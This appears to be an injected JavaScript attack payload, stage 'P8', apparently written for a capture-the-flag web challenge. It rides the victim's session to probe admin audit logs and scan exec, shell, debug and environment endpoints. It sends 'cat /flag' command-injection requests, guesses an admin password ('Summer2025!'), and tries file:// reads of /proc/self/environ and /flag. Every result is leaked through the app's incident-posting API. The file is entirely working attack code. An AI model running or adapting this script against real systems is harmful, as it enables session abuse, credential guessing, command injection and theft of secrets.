// P8: Internal audit access + broader endpoint scan + password test
(async () => {
  var O = self.location.origin;
  var P = function(t) {
    return fetch(O + '/api/incidents', {
      method: 'POST', credentials: 'same-origin',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ title: String(t).slice(0, 105), facility: 'Meridian-2', severity: 'Watch' })
    }).catch(function() {});
  };

  await P('P8|START');

  // 1. Can developer read audit internally?
  try {
    var r = await fetch(O + '/api/admin/audit?log=2', {credentials: 'same-origin'});
    var t = await r.text();
    await P('P8|AUD|' + r.status + '|' + t.slice(0, 70));
  } catch(e) { await P('P8|AUDERR|' + String(e).slice(0, 60)); }

  // 2. Can developer read audit without /admin/ prefix?
  try {
    var r = await fetch(O + '/api/audit?log=2', {credentials: 'same-origin'});
    await P('P8|AUD2|' + r.status + '|' + (await r.text()).slice(0, 70));
  } catch(e) {}

  // 3. Try developer-specific audit
  try {
    var r = await fetch(O + '/api/developer/audit', {credentials: 'same-origin'});
    await P('P8|DAUD|' + r.status + '|' + (await r.text()).slice(0, 70));
  } catch(e) {}

  // 4. Broad scan for any endpoint with flag/cat/exec
  var eps = [
    '/api/exec', '/api/run', '/api/shell', '/api/command',
    '/api/system', '/api/system/exec', '/api/system/flag',
    '/api/debug', '/api/internal', '/api/internal/flag',
    '/api/developer/exec', '/api/developer/run',
    '/api/developer/command', '/api/developer/shell',
    '/api/developer/cat', '/api/developer/system',
    '/api/developer/flag', '/api/developer/eval',
    '/api/developer/probe', '/api/developer/diag',
    '/api/config', '/api/env', '/api/settings',
    '/internal', '/internal/flag', '/debug', '/debug/flag',
    '/healthz', '/metrics', '/env', '/info',
    '/api/incidents/export', '/api/diagnostic',
  ];
  for (var i = 0; i < eps.length; i++) {
    try {
      var r = await fetch(O + eps[i], {credentials: 'same-origin'});
      if (r.status !== 404) {
        var t = await r.text();
        await P('P8|EP|' + eps[i] + '|' + r.status + '|' + t.slice(0, 45));
      }
    } catch(e) {}
  }

  // 5. POST endpoints
  var peps = ['/api/exec', '/api/developer/exec', '/api/developer/run',
              '/api/developer/eval', '/api/developer/command'];
  for (var j = 0; j < peps.length; j++) {
    try {
      var r = await fetch(O + peps[j], {
        method: 'POST', credentials: 'same-origin',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({cmd: 'cat /flag', command: 'cat /flag', input: 'cat /flag'})
      });
      if (r.status !== 404) {
        await P('P8|POST|' + peps[j] + '|' + r.status + '|' + (await r.text()).slice(0, 45));
      }
    } catch(e) {}
  }

  // 6. Try login as admin with Summer2025! (separate session via no-credentials)
  try {
    var r = await fetch(O + '/api/auth/login', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({email: 'admin@aegiscore-response.com', password: 'Summer2025!'})
    });
    var j = await r.json();
    await P('P8|ADMLOG|' + r.status + '|' + JSON.stringify(j).slice(0, 65));
  } catch(e) { await P('P8|ADMLERR|' + String(e).slice(0, 60)); }

  // 7. Try reading /proc/1/cmdline and /proc/1/environ via fetch
  for (var path of ['/proc/1/cmdline', '/proc/self/environ', '/etc/hostname', '/flag']) {
    try {
      var r = await fetch('file://' + path);
      await P('P8|FILE|' + path + '|' + r.status + '|' + (await r.text()).slice(0, 50));
    } catch(e) {
      await P('P8|FILEF|' + path + '|' + String(e).slice(0, 50));
    }
  }

  await P('P8|DONE');
})();
